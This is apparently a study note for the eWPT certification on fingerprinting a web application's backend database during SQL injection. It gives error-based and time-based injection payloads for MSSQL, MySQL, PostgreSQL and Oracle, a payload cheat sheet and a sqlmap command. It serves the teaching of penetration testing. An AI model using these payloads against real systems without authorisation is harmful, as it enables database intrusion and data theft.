2025-07-24 07:15

Status:

Tags: [[eWPT]] [[SQL Injection]]
###### Prerequisites: 

## Database Fingerprinting

**Database fingerprinting** is the process of identifying the backend Database Management System (DBMS) used by a web application. Knowing the DBMS helps an attacker craft accurate SQL injection payloads based on the system’s syntax, functions, and error responses.

---

### Why Fingerprint a Database?

- Every DBMS has unique syntax and error messages.
    
- Different DBMSs have different built-in functions, escape characters, and data types.
    
- Some SQL injection techniques work only on specific DBMSs (e.g., time-based injection using `SLEEP()` for MySQL, `WAITFOR DELAY` for MSSQL).
    
- Helps with exploit development and evasion.
    

---

### Common Error Messages by DBMS

#### **Microsoft SQL Server (MS-SQL)**

Typical error messages:

```
Incorrect syntax near '...' 
Unclosed quotation mark after the character string '...'
Line 1: Incorrect syntax near '...'
```

Examples:

```sql
' AND 1=CONVERT(int, (SELECT @@version))-- 
```

If MSSQL is used, an error like the following may appear:

```
Conversion failed when converting the varchar value ...
```

#### **MySQL**

Typical error messages:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
Unknown column '...' in 'field list'
```

Examples:

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version()),0x7e))-- 
```

If MySQL is used, you might see:

```
XPATH syntax error: '~5.7.31~'
```

#### **PostgreSQL**

Typical error messages:

```
ERROR: syntax error at or near "..."
LINE 1: ...
```

Examples:

```sql
' AND 1=CAST(version() AS INT)-- 
```

Error:

```
ERROR: invalid input syntax for type integer: "PostgreSQL 14.1"
```

#### **Oracle**

Typical error messages:

```
ORA-01756: quoted string not properly terminated
ORA-00933: SQL command not properly ended
ORA-00936: missing expression
```

Examples:

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS('example.com')-- 
```

---

### How to Perform Fingerprinting

1. **Inject invalid or malformed SQL queries**:
    
    - Input a single quote (`'`)
        
    - Input SQL reserved words (`AND`, `OR`, `SELECT`)
        
    - Close parenthesis improperly
        
    - Use functions specific to a DBMS
        
2. **Observe error messages**:
    
    - Analyze the phrasing and structure of the error.
        
    - Match against known patterns for different DBMSs.
        
3. **Check for DBMS-specific functions**:
    
    - MySQL: `SLEEP()`, `VERSION()`, `DATABASE()`
        
    - MSSQL: `WAITFOR DELAY`, `@@VERSION`, `DB_NAME()`
        
    - PostgreSQL: `current_database()`, `version()`
        
    - Oracle: `UTL_HTTP`, `DBMS_PIPE`, `SYS_CONTEXT`
        

---

### Silent Fingerprinting (Blind Techniques)

If error messages are hidden:

- Use **time-based payloads**:
    
    ```sql
    ' OR IF(1=1, SLEEP(5), 0)--     -- MySQL
    ' OR pg_sleep(5)--              -- PostgreSQL
    ' WAITFOR DELAY '0:0:5'--       -- MSSQL
```

    
- Use **response behavior analysis**:
    
    - Observe response time
        
    - Monitor changes in HTTP status or page structure
        
- Infer based on behavior from malformed queries
    

---

### Tools for Automated Fingerprinting

- **sqlmap**
    
    - Automatically detects DBMS during injection.
        
    - Use: `sqlmap -u <url> --dbs`
        
- **WhatWeb**
    
- **WAFW00F**
    
    - Might help indicate protected DBMS indirectly.
        

---

### Manual Fingerprinting Cheat Sheet

|Test Payload|Expected Error Pattern|Possible DBMS|
|---|---|---|
|`'`|Unclosed quotation|Any|
|`AND 1=CONVERT(int, 'a')`|Conversion failed|MSSQL|
|`AND EXTRACTVALUE()`|XPATH syntax error|MySQL|
|`AND 1=CAST(version() AS INT)`|Invalid input syntax|PostgreSQL|
|`AND 1=UTL_HTTP.REQUEST()`|ORA-XXXX errors|Oracle|

---

### Tips

- Always check if the application suppresses SQL errors.
    
- Use HTTP headers or URL parameters if the main input is sanitized.
    
- Check both GET and POST requests.
    
- Combine fingerprinting with directory fuzzing or JavaScript analysis.
    
